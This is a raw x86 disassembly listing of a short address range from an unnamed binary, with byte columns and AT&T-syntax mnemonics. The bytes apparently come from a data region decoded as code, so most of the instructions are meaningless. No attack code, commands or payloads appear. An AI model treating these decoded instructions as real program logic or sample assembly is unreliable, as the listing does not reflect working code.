  406ddf:	20 ba 0d 06 00 1c    	and    %bh,0x1c00060d(%edx)
  406de5:	20 ba 0d 06 00 27    	and    %bh,0x2700060d(%edx)
  406deb:	20 24 0d 06 00 47 20 	and    %ah,0x20470006(,%ecx,1)
  406df2:	24 0d                	and    $0xd,%al
  406df4:	06                   	push   %es
  406df5:	00 65 20             	add    %ah,0x20(%ebp)
  406df8:	ba 0d 06 00 73       	mov    $0x7300060d,%edx
  406dfd:	20 f8                	and    %bh,%al
  406dff:	18 06                	sbb    %al,(%esi)
  406e01:	00 90 20 f8 18 06    	add    %dl,0x618f820(%eax)
  406e07:	00 ab 20 f8 18 06    	add    %ch,0x618f820(%ebx)
  406e0d:	00 c6                	add    %al,%dh
  406e0f:	20 f8                	and    %bh,%al
  406e11:	18 06                	sbb    %al,(%esi)
  406e13:	00 df                	add    %bl,%bh
  406e15:	20 f8                	and    %bh,%al
  406e17:	18 06                	sbb    %al,(%esi)
  406e19:	00 f8                	add    %bh,%al
  406e1b:	20 f8                	and    %bh,%al
  406e1d:	18 06                	sbb    %al,(%esi)
  406e1f:	00 15 21 f8 18 00    	add    %dl,0x18f821
  406e25:	00 00                	add    %al,(%eax)
  406e27:	00 01                	add    %al,(%ecx)
  406e29:	00 00                	add    %al,(%eax)
  406e2b:	00 00                	add    %al,(%eax)
  406e2d:	00 01                	add    %al,(%ecx)
  406e2f:	00 01                	add    %al,(%ecx)
  406e31:	00 00                	add    %al,(%eax)
  406e33:	00 00                	add    %al,(%eax)
  406e35:	00 29                	add    %ch,(%ecx)
  406e37:	00 37                	add    %dh,(%edi)
  406e39:	00 05 00 01 00 01    	add    %al,0x1000100
  406e3f:	00 00                	add    %al,(%eax)
  406e41:	00 00                	add    %al,(%eax)
  406e43:	00 3a                	add    %bh,(%edx)
  406e45:	00 37                	add    %dh,(%edi)
  406e47:	00 09                	add    %cl,(%ecx)
  406e49:	00 01                	add    %al,(%ecx)
  406e4b:	00 02                	add    %al,(%edx)
  406e4d:	00 00                	add    %al,(%eax)
  406e4f:	01 10                	add    %edx,(%eax)
  406e51:	00 45 00             	add    %al,0x0(%ebp)
  406e54:	37                   	aaa
  406e55:	00 0d 00 01 00 03    	add    %cl,0x3000100
  406e5b:	00 05 01 00 00 4f    	add    %al,0x4f000001
  406e61:	00 00                	add    %al,(%eax)
  406e63:	00 0d 00 05 00 08    	add    %cl,0x8000500
  406e69:	00 05 01 00 00 5d    	add    %al,0x5d000001
  406e6f:	00 00                	add    %al,(%eax)
  406e71:	00 0d 00 05 00 0f    	add    %cl,0xf000500
  406e77:	00 01                	add    %al,(%ecx)
  406e79:	00 10                	add    %dl,(%eax)
  406e7b:	00 78 00             	add    %bh,0x0(%eax)
  406e7e:	00 00                	add    %al,(%eax)
  406e80:	0d 00 06 00 11       	or     $0x11000600,%eax
  406e85:	00 01                	add    %al,(%ecx)
  406e87:	00 00                	add    %al,(%eax)
  406e89:	00 81 00 86 00 0d    	add    %al,0xd008600(%ecx)
  406e8f:	00 12                	add    %dl,(%edx)
  406e91:	00 13                	add    %dl,(%ebx)
  406e93:	00 01                	add    %al,(%ecx)
  406e95:	00 10                	add    %dl,(%eax)
  406e97:	00 8b 00 86 00 0d    	add    %cl,0xd008600(%ebx)
  406e9d:	00 12                	add    %dl,(%edx)
  406e9f:	00 21                	add    %ah,(%ecx)
  406ea1:	00 01                	add    %al,(%ecx)
  406ea3:	00 00                	add    %al,(%eax)
  406ea5:	00 98 00 86 00 0d    	add    %bl,0xd008600(%eax)
  406eab:	00 1d 00 36 00 01    	add    %bl,0x1003600
  406eb1:	00 00                	add    %al,(%eax)
  406eb3:	00 a1 00 86 00 0d    	add    %ah,0xd008600(%ecx)
  406eb9:	00 22                	add    %ah,(%edx)
  406ebb:	00 45 00             	add    %al,0x0(%ebp)
  406ebe:	01 00                	add    %eax,(%eax)
  406ec0:	00 00                	add    %al,(%eax)
  406ec2:	ad                   	lods   %ds:(%esi),%eax
  406ec3:	00 86 00 0d 00 22    	add    %al,0x22000d00(%esi)
  406ec9:	00 47 00             	add    %al,0x0(%edi)
  406ecc:	01 00                	add    %eax,(%eax)
  406ece:	10 00                	adc    %al,(%eax)
  406ed0:	b1 00                	mov    $0x0,%cl
  406ed2:	86 00                	xchg   %al,(%eax)
  406ed4:	0d 00 23 00 4b       	or     $0x4b002300,%eax
  406ed9:	00 01                	add    %al,(%ecx)
  406edb:	00 00                	add    %al,(%eax)
  406edd:	00 b9 00 86 00 0d    	add    %bh,0xd008600(%ecx)
  406ee3:	00 28                	add    %ch,(%eax)
  406ee5:	00 5d 00             	add    %bl,0x0(%ebp)
  406ee8:	01 00                	add    %eax,(%eax)
  406eea:	00 00                	add    %al,(%eax)
  406eec:	c9                   	leave
  406eed:	00 86 00 0d 00 28    	add    %al,0x28000d00(%esi)
  406ef3:	00 62 00             	add    %ah,0x0(%edx)
  406ef6:	00 01                	add    %al,(%ecx)
  406ef8:	10 00                	adc    %al,(%eax)
  406efa:	d6                   	salc
  406efb:	00 86 00 0d 00 28    	add    %al,0x28000d00(%esi)
  406f01:	00 64 00 03          	add    %ah,0x3(%eax,%eax,1)
  406f05:	01 00                	add    %eax,(%eax)
  406f07:	00 dd                	add    %bl,%ch
  406f09:	00 00                	add    %al,(%eax)
  406f0b:	00 49 00             	add    %cl,0x0(%ecx)
  406f0e:	35 00 7c 00 0a       	xor    $0xa007c00,%eax
  406f13:	01 00                	add    %eax,(%eax)
  406f15:	00 f2                	add    %dh,%dl
  406f17:	00 00                	add    %al,(%eax)
  406f19:	00 51 00             	add    %dl,0x0(%ecx)
  406f1c:	35 00 80 00 02       	xor    $0x2008000,%eax
  406f21:	01 00                	add    %eax,(%eax)
  406f23:	00 00                	add    %al,(%eax)
  406f25:	01 00                	add    %eax,(%eax)
  406f27:	00 55 00             	add    %dl,0x0(%ebp)
  406f2a:	37                   	aaa
  406f2b:	00 80 00 00 01 00    	add    %al,0x10000(%eax)
  406f31:	00 56 0e             	add    %dl,0xe(%esi)
  406f34:	00 00                	add    %al,(%eax)
  406f36:	49                   	dec    %ecx
  406f37:	00 3b                	add    %bh,(%ebx)
  406f39:	00 80 00 05 00 00    	add    %al,0x500(%eax)
  406f3f:	00 6f 16             	add    %ch,0x16(%edi)
  406f42:	00 00                	add    %al,(%eax)
  406f44:	0d 00 3b 00 84       	or     $0x84003b00,%eax
  406f49:	00 31                	add    %dh,(%ecx)
  406f4b:	00 99 01 20 00 31    	add    %bl,0x31002001(%ecx)
  406f51:	00 c2                	add    %al,%dl
  406f53:	01 2d 00 31 00 e4    	add    %ebp,0xe4003100
  406f59:	01 3a                	add    %edi,(%edx)
  406f5b:	00 31                	add    %dh,(%ecx)
  406f5d:	00 09                	add    %cl,(%ecx)
  406f5f:	02 47 00             	add    0x0(%edi),%al
  406f62:	11 00                	adc    %eax,(%eax)
  406f64:	ac                   	lods   %ds:(%esi),%al
  406f65:	02 90 00 16 00 cc    	add    -0x33ffea00(%eax),%dl
  406f6b:	02 99 00 16 00 d2    	add    -0x2dffea00(%ecx),%bl
  406f71:	02 99 00 16 00 d7    	add    -0x28ffea00(%ecx),%bl
  406f77:	02 99 00 16 00 dc    	add    -0x23ffea00(%ecx),%bl
  406f7d:	02 99 00 16 00 e0    	add    -0x1fffea00(%ecx),%bl
  406f83:	02 99 00 16 00 e4    	add    -0x1bffea00(%ecx),%bl
  406f89:	02 9c 00 16 00 ea 02 	add    0x2ea0016(%eax,%eax,1),%bl
  406f90:	99                   	cltd
  406f91:	00 16                	add    %dl,(%esi)
  406f93:	00 f0                	add    %dh,%al
  406f95:	02 99 00 16 00 f6    	add    -0x9ffea00(%ecx),%bl
  406f9b:	02 99 00 16 00 01    	add    0x1001600(%ecx),%bl
  406fa1:	03 99 00 16 00 0c    	add    0xc001600(%ecx),%ebx
  406fa7:	03 99 00 16 00 12    	add    0x12001600(%ecx),%ebx
  406fad:	03 99 00 16 00 c8    	add    -0x37ffea00(%ecx),%ebx
  406fb3:	03 af 00 16 00 ee    	add    -0x11ffea00(%edi),%ebp
  406fb9:	03 b2 00 11 00 f0    	add    -0xfffef00(%edx),%esi
  406fbf:	03 b6 00 11 00 fd    	add    -0x2ffef00(%esi),%esi
  406fc5:	03 b9 00 11 00 1b    	add    0x1b001100(%ecx),%edi
  406fcb:	04 bd                	add    $0xbd,%al
  406fcd:	00 11                	add    %dl,(%ecx)
  406fcf:	00 35 04 c1 00 16    	add    %dh,0x1600c104
  406fd5:	00 4b 04             	add    %cl,0x4(%ebx)
  406fd8:	c5 00                	lds    (%eax),%eax
  406fda:	11 00                	adc    %eax,(%eax)
  406fdc:	53                   	push   %ebx
  406fdd:	04 c9                	add    $0xc9,%al
  406fdf:	00 16                	add    %dl,(%esi)
  406fe1:	00 5c 04 c1          	add    %bl,-0x3f(%esp,%eax,1)
  406fe5:	00 16                	add    %dl,(%esi)
  406fe7:	00 62 04             	add    %ah,0x4(%edx)
  406fea:	9c                   	pushf
  406feb:	00 16                	add    %dl,(%esi)
  406fed:	00 6b 04             	add    %ch,0x4(%ebx)
  406ff0:	af                   	scas   %es:(%edi),%eax
  406ff1:	00 16                	add    %dl,(%esi)
  406ff3:	00 19                	add    %bl,(%ecx)
  406ff5:	05 ef 00 16 00       	add    $0x1600ef,%eax
  406ffa:	23 05 9c 00 16 00    	and    0x16009c,%eax
  407000:	48                   	dec    %eax
  407001:	05 f3 00 16 00       	add    $0x1600f3,%eax
  407006:	4d                   	dec    %ebp
  407007:	05 f3 00 16 00       	add    $0x1600f3,%eax
  40700c:	d7                   	xlat   %ds:(%ebx)
  40700d:	05 09 01 11 00       	add    $0x110109,%eax
  407012:	52                   	push   %edx
  407013:	06                   	push   %es
  407014:	f3 00 11             	repz add %dl,(%ecx)
  407017:	00 75 06             	add    %dh,0x6(%ebp)
  40701a:	99                   	cltd
  40701b:	00 51 80             	add    %dl,-0x80(%ecx)
  40701e:	ed                   	in     (%dx),%eax
  40701f:	06                   	push   %es
  407020:	9c                   	pushf
  407021:	00 11                	add    %dl,(%ecx)
  407023:	00 f8                	add    %bh,%al
  407025:	06                   	push   %es
  407026:	43                   	inc    %ebx
  407027:	01 11                	add    %edx,(%ecx)
  407029:	00 fe                	add    %bh,%dh
  40702b:	06                   	push   %es
  40702c:	09 01                	or     %eax,(%ecx)
  40702e:	11 00                	adc    %eax,(%eax)
  407030:	5a                   	pop    %edx
  407031:	07                   	pop    %es
  407032:	9c                   	pushf
  407033:	00 16                	add    %dl,(%esi)
  407035:	00 3f                	add    %bh,(%edi)
  407037:	09 af 00 16 00 8d    	or     %ebp,-0x72ffea00(%edi)
  40703d:	09 a4 01 51 80 98 09 	or     %esp,0x9988051(%ecx,%eax,1)
  407044:	99                   	cltd
  407045:	00 16                	add    %dl,(%esi)
  407047:	00 a1 09 dd 01 36    	add    %ah,0x3601dd09(%ecx)
  40704d:	00 a8 09 99 00 16    	add    %ch,0x16009909(%eax)
  407053:	00 ab 09 99 00 11    	add    %ch,0x11009909(%ebx)
  407059:	00 e0                	add    %ah,%al
  40705b:	09 9c 00 11 00 e9 09 	or     %ebx,0x9e90011(%eax,%eax,1)
  407062:	ed                   	in     (%dx),%eax
  407063:	01 16                	add    %edx,(%esi)
  407065:	00 10                	add    %dl,(%eax)
  407067:	0a f5                	or     %ch,%dh
  407069:	01 16                	add    %edx,(%esi)
  40706b:	00 1e                	add    %bl,(%esi)
  40706d:	0a 9c 00 16 00 2f 0a 	or     0xa2f0016(%eax,%eax,1),%bl
  407074:	99                   	cltd
  407075:	00 16                	add    %dl,(%esi)
  407077:	00 3c 0a             	add    %bh,(%edx,%ecx,1)
  40707a:	ef                   	out    %eax,(%dx)
  40707b:	00 16                	add    %dl,(%esi)
  40707d:	00 f3                	add    %dh,%bl
  40707f:	0a 27                	or     (%edi),%ah
  407081:	02 06                	add    (%esi),%al
  407083:	10 ad 0b 9c 00 06    	adc    %ch,0x6009c0b(%ebp)
  407089:	10 b4 0b 9c 00 06 06 	adc    %dh,0x606009c(%ebx,%ecx,1)
  407090:	c0 0b 49             	rorb   $0x49,(%ebx)
  407093:	02 56 80             	add    -0x80(%esi),%dl
  407096:	c8 0b 4c 02          	enter  $0x4c0b,$0x2
  40709a:	56                   	push   %esi
  40709b:	80 d6 0b             	adc    $0xb,%dh
  40709e:	4c                   	dec    %esp
  40709f:	02 56 80             	add    -0x80(%esi),%dl
  4070a2:	ea 0b 4c 02 06 00 7c 	ljmp   $0x7c00,$0x6024c0b
  4070a9:	16                   	push   %ss
  4070aa:	99                   	cltd
  4070ab:	00 06                	add    %al,(%esi)
  4070ad:	00 8b 16 99 00 50    	add    %cl,0x50009916(%ebx)
  4070b3:	20 00                	and    %al,(%eax)
  4070b5:	00 00                	add    %al,(%eax)
  4070b7:	00 06                	add    %al,(%esi)
  4070b9:	18 4a 01             	sbb    %cl,0x1(%edx)
  4070bc:	13 00                	adc    (%eax),%eax
  4070be:	01 00                	add    %eax,(%eax)
  4070c0:	58                   	pop    %eax
  4070c1:	20 00                	and    %al,(%eax)
  4070c3:	00 00                	add    %al,(%eax)
  4070c5:	00 06                	add    %al,(%esi)
  4070c7:	18 4a 01             	sbb    %cl,0x1(%edx)
  4070ca:	13 00                	adc    (%eax),%eax
  4070cc:	01 00                	add    %eax,(%eax)
  4070ce:	60                   	pusha
  4070cf:	20 00                	and    %al,(%eax)
  4070d1:	00 00                	add    %al,(%eax)
  4070d3:	00 11                	add    %dl,(%ecx)
  4070d5:	18 85 01 17 00 01    	sbb    %al,0x1001701(%ebp)
  4070db:	00 8c 20 00 00 00 00 	add    %cl,0x0(%eax,%eiz,1)
  4070e2:	13 08                	adc    (%eax),%ecx
  4070e4:	8c 01                	mov    %es,(%ecx)
  4070e6:	1b 00                	sbb    (%eax),%eax
  4070e8:	01 00                	add    %eax,(%eax)
  4070ea:	a8 20                	test   $0x20,%al
  4070ec:	00 00                	add    %al,(%eax)
  4070ee:	00 00                	add    %al,(%eax)
  4070f0:	13 08                	adc    (%eax),%ecx
  4070f2:	b2 01                	mov    $0x1,%dl
  4070f4:	28 00                	sub    %al,(%eax)
  4070f6:	01 00                	add    %eax,(%eax)
  4070f8:	c4 20                	les    (%eax),%esp
  4070fa:	00 00                	add    %al,(%eax)
  4070fc:	00 00                	add    %al,(%eax)
  4070fe:	13 08                	adc    (%eax),%ecx
  407100:	db 01                	fildl  (%ecx)
  407102:	35 00 01 00 e0       	xor    $0xe0000100,%eax
  407107:	20 00                	and    %al,(%eax)
  407109:	00 00                	add    %al,(%eax)
  40710b:	00 13                	add    %dl,(%ebx)
  40710d:	08 f9                	or     %bh,%cl
  40710f:	01 42 00             	add    %eax,0x0(%edx)
  407112:	01 00                	add    %eax,(%eax)
  407114:	fc                   	cld
  407115:	20 00                	and    %al,(%eax)
  407117:	00 00                	add    %al,(%eax)
  407119:	00 46 02             	add    %al,0x2(%esi)
  40711c:	3f                   	aas
  40711d:	02 63 00             	add    0x0(%ebx),%ah
  407120:	01 00                	add    %eax,(%eax)
  407122:	1c 21                	sbb    $0x21,%al
  407124:	00 00                	add    %al,(%eax)
  407126:	00 00                	add    %al,(%eax)
  407128:	46                   	inc    %esi
  407129:	02 48 02             	add    0x2(%eax),%cl
  40712c:	68 00 02 00 34       	push   $0x34000200
  407131:	21 00                	and    %eax,(%eax)
  407133:	00 00                	add    %al,(%eax)
  407135:	00 83 00 59 02 6c    	add    %al,0x6c025900(%ebx)
  40713b:	00 02                	add    %al,(%edx)
  40713d:	00 50 21             	add    %dl,0x21(%eax)
  407140:	00 00                	add    %al,(%eax)
  407142:	00 00                	add    %al,(%eax)
  407144:	46                   	inc    %esi
  407145:	02 61 02             	add    0x2(%ecx),%ah
  407148:	71 00                	jno    0x40714a
  40714a:	02 00                	add    (%eax),%al
  40714c:	68 21 00 00 00       	push   $0x21
  407151:	00 11                	add    %dl,(%ecx)
  407153:	00 6a 02             	add    %ch,0x2(%edx)
  407156:	78 00                	js     0x407158
  407158:	02 00                	add    (%eax),%al
  40715a:	8c 21                	mov    %fs,(%ecx)
  40715c:	00 00                	add    %al,(%eax)
  40715e:	00 00                	add    %al,(%eax)
  407160:	01 00                	add    %eax,(%eax)
  407162:	88 02                	mov    %al,(%edx)
  407164:	80 00 03             	addb   $0x3,(%eax)
  407167:	00 a8 21 00 00 00    	add    %ch,0x21(%eax)
  40716d:	00 06                	add    %al,(%esi)
  40716f:	18 4a 01             	sbb    %cl,0x1(%edx)
  407172:	13 00                	adc    (%eax),%eax
  407174:	04 00                	add    $0x0,%al
  407176:	b0 21                	mov    $0x21,%al
  407178:	00 00                	add    %al,(%eax)
  40717a:	00 00                	add    %al,(%eax)
  40717c:	03 08                	add    (%eax),%ecx
  40717e:	9c                   	pushf
  40717f:	02 8b 00 04 00 dc    	add    -0x23fffc00(%ebx),%cl
  407185:	21 00                	and    %eax,(%eax)
  407187:	00 00                	add    %al,(%eax)
  407189:	00 06                	add    %al,(%esi)
  40718b:	18 4a 01             	sbb    %cl,0x1(%edx)
  40718e:	13 00                	adc    (%eax),%eax
  407190:	04 00                	add    $0x0,%al
  407192:	e4 21                	in     $0x21,%al
  407194:	00 00                	add    %al,(%eax)
  407196:	00 00                	add    %al,(%eax)
  407198:	11 18                	adc    %ebx,(%eax)
  40719a:	85 01                	test   %eax,(%ecx)
  40719c:	17                   	pop    %ss
  40719d:	00 04 00             	add    %al,(%eax,%eax,1)
  4071a0:	74 22                	je     0x4071c4
  4071a2:	00 00                	add    %al,(%eax)
  4071a4:	00 00                	add    %al,(%eax)
  4071a6:	06                   	push   %es
  4071a7:	18 4a 01             	sbb    %cl,0x1(%edx)
  4071aa:	13 00                	adc    (%eax),%eax
  4071ac:	04 00                	add    $0x0,%al
  4071ae:	7c 22                	jl     0x4071d2
  4071b0:	00 00                	add    %al,(%eax)
  4071b2:	00 00                	add    %al,(%eax)
  4071b4:	06                   	push   %es
  4071b5:	18 4a 01             	sbb    %cl,0x1(%edx)
  4071b8:	13 00                	adc    (%eax),%eax
  4071ba:	04 00                	add    $0x0,%al
  4071bc:	84 22                	test   %ah,(%edx)
  4071be:	00 00                	add    %al,(%eax)
  4071c0:	00 00                	add    %al,(%eax)
  4071c2:	16                   	push   %ss
  4071c3:	00 81 00 17 00 04    	add    %al,0x4001700(%ecx)
  4071c9:	00 c8                	add    %cl,%al
  4071cb:	26 00 00             	add    %al,%es:(%eax)
  4071ce:	00 00                	add    %al,(%eax)
  4071d0:	16                   	push   %ss
  4071d1:	00 1d 03 17 00 04    	add    %bl,0x4001703
  4071d7:	00 e0                	add    %ah,%al
  4071d9:	27                   	daa
  4071da:	00 00                	add    %al,(%eax)
  4071dc:	00 00                	add    %al,(%eax)
  4071de:	16                   	push   %ss
  4071df:	00 27                	add    %ah,(%edi)
  4071e1:	03 17                	add    (%edi),%edx
  4071e3:	00 04 00             	add    %al,(%eax,%eax,1)
  4071e6:	14 28                	adc    $0x28,%al
  4071e8:	00 00                	add    %al,(%eax)
  4071ea:	00 00                	add    %al,(%eax)
  4071ec:	11 00                	adc    %eax,(%eax)
  4071ee:	37                   	aaa
  4071ef:	03 9f 00 04 00 64    	add    0x64000400(%edi),%ebx
  4071f5:	28 00                	sub    %al,(%eax)
  4071f7:	00 00                	add    %al,(%eax)
  4071f9:	00 11                	add    %dl,(%ecx)
  4071fb:	00 3e                	add    %bh,(%esi)
  4071fd:	03 9f 00 04 00 b4    	add    -0x4bfffc00(%edi),%ebx
  407203:	28 00                	sub    %al,(%eax)
  407205:	00 00                	add    %al,(%eax)
  407207:	00 11                	add    %dl,(%ecx)
  407209:	00 43 03             	add    %al,0x3(%ebx)
  40720c:	9f                   	lahf
  40720d:	00 04 00             	add    %al,(%eax,%eax,1)
  407210:	6c                   	insb   (%dx),%es:(%edi)
  407211:	2a 00                	sub    (%eax),%al
  407213:	00 00                	add    %al,(%eax)
  407215:	00 11                	add    %dl,(%ecx)
  407217:	00 56 03             	add    %dl,0x3(%esi)
  40721a:	9f                   	lahf
  40721b:	00 04 00             	add    %al,(%eax,%eax,1)
  40721e:	bc 2a 00 00 00       	mov    $0x2a,%esp
  407223:	00 11                	add    %dl,(%ecx)
  407225:	00 65 03             	add    %ah,0x3(%ebp)
  407228:	9f                   	lahf
  407229:	00 04 00             	add    %al,(%eax,%eax,1)
  40722c:	00 00                	add    %al,(%eax)
  40722e:	00 00                	add    %al,(%eax)
  407230:	80 00 16             	addb   $0x16,(%eax)
  407233:	20 75 03             	and    %dh,0x3(%ebp)
  407236:	a3 00 04 00 00       	mov    %eax,0x400
  40723b:	00 00                	add    %al,(%eax)
  40723d:	00 80 00 16 20 92    	add    %al,-0x6ddfea00(%eax)
  407243:	03 a8 00 05 00 10    	add    0x10000500(%eax),%ebp
  407249:	2b 00                	sub    (%eax),%eax
  40724b:	00 00                	add    %al,(%eax)
  40724d:	00 11                	add    %dl,(%ecx)
  40724f:	08 6d 0e             	or     %ch,0xe(%ebp)
  407252:	17                   	pop    %ss
  407253:	00 07                	add    %al,(%edi)
  407255:	00 1c 2b             	add    %bl,(%ebx,%ebp,1)
  407258:	00 00                	add    %al,(%eax)
  40725a:	00 00                	add    %al,(%eax)
  40725c:	11 08                	adc    %ecx,(%eax)
  40725e:	79 0e                	jns    0x40726e
  407260:	17                   	pop    %ss
  407261:	00 07                	add    %al,(%edi)
  407263:	00 28                	add    %ch,(%eax)
  407265:	2b 00                	sub    (%eax),%eax
  407267:	00 00                	add    %al,(%eax)
  407269:	00 11                	add    %dl,(%ecx)
  40726b:	08 85 0e 17 00 07    	or     %al,0x700170e(%ebp)
  407271:	00 64 2b 00          	add    %ah,0x0(%ebx,%ebp,1)
  407275:	00 00                	add    %al,(%eax)
  407277:	00 11                	add    %dl,(%ecx)
  407279:	18 85 01 17 00 07    	sbb    %al,0x7001701(%ebp)
  40727f:	00 98 2b 00 00 00    	add    %bl,0x2b(%eax)
  407285:	00 06                	add    %al,(%esi)
  407287:	18 4a 01             	sbb    %cl,0x1(%edx)
  40728a:	13 00                	adc    (%eax),%eax
  40728c:	07                   	pop    %es
  40728d:	00 a0 2b 00 00 00    	add    %ah,0x2b(%eax)
  407293:	00 16                	add    %dl,(%esi)
  407295:	00 78 04             	add    %bh,0x4(%eax)
  407298:	17                   	pop    %ss
  407299:	00 07                	add    %al,(%edi)
  40729b:	00 74 2c 00          	add    %dh,0x0(%esp,%ebp,1)
  40729f:	00 00                	add    %al,(%eax)
  4072a1:	00 16                	add    %dl,(%esi)
  4072a3:	00 85 04 cc 00 07    	add    %al,0x700cc04(%ebp)
  4072a9:	00 e4                	add    %ah,%ah
  4072ab:	2d 00 00 00 00       	sub    $0x0,%eax
  4072b0:	16                   	push   %ss
  4072b1:	00 95 04 d1 00 08    	add    %dl,0x800d104(%ebp)
  4072b7:	00 48 2f             	add    %cl,0x2f(%eax)
  4072ba:	00 00                	add    %al,(%eax)
  4072bc:	00 00                	add    %al,(%eax)
  4072be:	16                   	push   %ss
  4072bf:	00 9a 04 d5 00 08    	add    %bl,0x800d504(%edx)
  4072c5:	00 a4 2f 00 00 00 00 	add    %ah,0x0(%edi,%ebp,1)
  4072cc:	16                   	push   %ss
  4072cd:	00 a1 04 d5 00 08    	add    %ah,0x800d504(%ecx)
  4072d3:	00 0c 30             	add    %cl,(%eax,%esi,1)
  4072d6:	00 00                	add    %al,(%eax)
  4072d8:	00 00                	add    %al,(%eax)
  4072da:	16                   	push   %ss
  4072db:	00 a8 04 d5 00 08    	add    %ch,0x800d504(%eax)
  4072e1:	00 68 30             	add    %ch,0x30(%eax)
  4072e4:	00 00                	add    %al,(%eax)
  4072e6:	00 00                	add    %al,(%eax)
  4072e8:	16                   	push   %ss
  4072e9:	00 ac 04 d5 00 08 00 	add    %ch,0x800d5(%esp,%eax,1)
  4072f0:	6c                   	insb   (%dx),%es:(%edi)
  4072f1:	31 00                	xor    %eax,(%eax)
  4072f3:	00 00                	add    %al,(%eax)
  4072f5:	00 16                	add    %dl,(%esi)
  4072f7:	00 b6 04 d5 00 08    	add    %dh,0x800d504(%esi)
  4072fd:	00 24 32             	add    %ah,(%edx,%esi,1)
  407300:	00 00                	add    %al,(%eax)
  407302:	00 00                	add    %al,(%eax)
  407304:	16                   	push   %ss
  407305:	00 ba 04 d5 00 08    	add    %bh,0x800d504(%edx)
  40730b:	00 c4                	add    %al,%ah
  40730d:	32 00                	xor    (%eax),%al
  40730f:	00 00                	add    %al,(%eax)
  407311:	00 16                	add    %dl,(%esi)
  407313:	00 be 04 d5 00 08    	add    %bh,0x800d504(%esi)
  407319:	00 9c 33 00 00 00 00 	add    %bl,0x0(%ebx,%esi,1)
  407320:	16                   	push   %ss
  407321:	00 cf                	add    %cl,%bh
  407323:	04 d9                	add    $0xd9,%al
  407325:	00 08                	add    %cl,(%eax)
  407327:	00 8c 35 00 00 00 00 	add    %cl,0x0(%ebp,%esi,1)
  40732e:	16                   	push   %ss
  40732f:	00 df                	add    %bl,%bh
  407331:	04 df                	add    $0xdf,%al
  407333:	00 09                	add    %cl,(%ecx)
  407335:	00 c0                	add    %al,%al
  407337:	35 00 00 00 00       	xor    $0x0,%eax
  40733c:	16                   	push   %ss
  40733d:	00 eb                	add    %ch,%bl
  40733f:	04 e5                	add    $0xe5,%al
  407341:	00 0a                	add    %cl,(%edx)
  407343:	00 c0                	add    %al,%al
  407345:	36 00 00             	add    %al,%ss:(%eax)
  407348:	00 00                	add    %al,(%eax)
  40734a:	16                   	push   %ss
  40734b:	00 f4                	add    %dh,%ah
  40734d:	04 d9                	add    $0xd9,%al
  40734f:	00 0b                	add    %cl,(%ebx)
  407351:	00 00                	add    %al,(%eax)
  407353:	37                   	aaa
  407354:	00 00                	add    %al,(%eax)
  407356:	00 00                	add    %al,(%eax)
  407358:	16                   	push   %ss
  407359:	00 fc                	add    %bh,%ah
  40735b:	04 17                	add    $0x17,%al
  40735d:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407360:	f8                   	clc
  407361:	37                   	aaa
  407362:	00 00                	add    %al,(%eax)
  407364:	00 00                	add    %al,(%eax)
  407366:	16                   	push   %ss
  407367:	00 0b                	add    %cl,(%ebx)
  407369:	05 ea 00 0c 00       	add    $0xc00ea,%eax
  40736e:	40                   	inc    %eax
  40736f:	38 00                	cmp    %al,(%eax)
  407371:	00 00                	add    %al,(%eax)
  407373:	00 16                	add    %dl,(%esi)
  407375:	00 14 05 17 00 0d 00 	add    %dl,0xd0017(,%eax,1)
  40737c:	bc 38 00 00 00       	mov    $0x38,%esp
  407381:	00 11                	add    %dl,(%ecx)
  407383:	08 fc                	or     %bh,%ah
  407385:	12 ea                	adc    %dl,%ch
  407387:	00 0d 00 c8 38 00    	add    %cl,0x38c800
  40738d:	00 00                	add    %al,(%eax)
  40738f:	00 11                	add    %dl,(%ecx)
  407391:	08 0b                	or     %cl,(%ebx)
  407393:	13 ea                	adc    %edx,%ebp
  407395:	00 0e                	add    %cl,(%esi)
  407397:	00 d8                	add    %bl,%al
  407399:	38 00                	cmp    %al,(%eax)
  40739b:	00 00                	add    %al,(%eax)
  40739d:	00 06                	add    %al,(%esi)
  40739f:	18 4a 01             	sbb    %cl,0x1(%edx)
  4073a2:	13 00                	adc    (%eax),%eax
  4073a4:	0f 00 e0             	verr   %eax
  4073a7:	38 00                	cmp    %al,(%eax)
  4073a9:	00 00                	add    %al,(%eax)
  4073ab:	00 16                	add    %dl,(%esi)
  4073ad:	00 1e                	add    %bl,(%esi)
  4073af:	05 df 00 0f 00       	add    $0xf00df,%eax
  4073b4:	b0 41                	mov    $0x41,%al
  4073b6:	00 00                	add    %al,(%eax)
  4073b8:	00 00                	add    %al,(%eax)
  4073ba:	16                   	push   %ss
  4073bb:	00 26                	add    %ah,(%esi)
  4073bd:	05 df 00 10 00       	add    $0x1000df,%eax
  4073c2:	8c 46 00             	mov    %es,0x0(%esi)
  4073c5:	00 00                	add    %al,(%eax)
  4073c7:	00 16                	add    %dl,(%esi)
  4073c9:	00 2f                	add    %ch,(%edi)
  4073cb:	05 e5 00 11 00       	add    $0x1100e5,%eax
  4073d0:	d0 46 00             	rolb   $1,0x0(%esi)
  4073d3:	00 00                	add    %al,(%eax)
  4073d5:	00 16                	add    %dl,(%esi)
  4073d7:	00 37                	add    %dh,(%edi)
  4073d9:	05 e5 00 12 00       	add    $0x1200e5,%eax
  4073de:	14 47                	adc    $0x47,%al
  4073e0:	00 00                	add    %al,(%eax)
  4073e2:	00 00                	add    %al,(%eax)
  4073e4:	16                   	push   %ss
  4073e5:	00 5a 05             	add    %bl,0x5(%edx)
  4073e8:	e5 00                	in     $0x0,%eax
  4073ea:	13 00                	adc    (%eax),%eax
  4073ec:	04 48                	add    $0x48,%al
  4073ee:	00 00                	add    %al,(%eax)
  4073f0:	00 00                	add    %al,(%eax)
  4073f2:	16                   	push   %ss
  4073f3:	00 63 05             	add    %ah,0x5(%ebx)
  4073f6:	e5 00                	in     $0x0,%eax
  4073f8:	14 00                	adc    $0x0,%al
  4073fa:	f4                   	hlt
  4073fb:	48                   	dec    %eax
  4073fc:	00 00                	add    %al,(%eax)
  4073fe:	00 00                	add    %al,(%eax)
  407400:	16                   	push   %ss
  407401:	00 73 05             	add    %dh,0x5(%ebx)
  407404:	f7 00 15 00 00 00    	testl  $0x15,(%eax)
  40740a:	00 00                	add    %al,(%eax)
  40740c:	80 00 16             	addb   $0x16,(%eax)
  40740f:	20 86 05 fd 00 17    	and    %al,0x1700fd05(%esi)
  407415:	00 00                	add    %al,(%eax)
  407417:	00 00                	add    %al,(%eax)
  407419:	00 80 00 16 20 de    	add    %al,-0x21dfea00(%eax)
  40741f:	05 0c 01 1f 00       	add    $0x1f010c,%eax
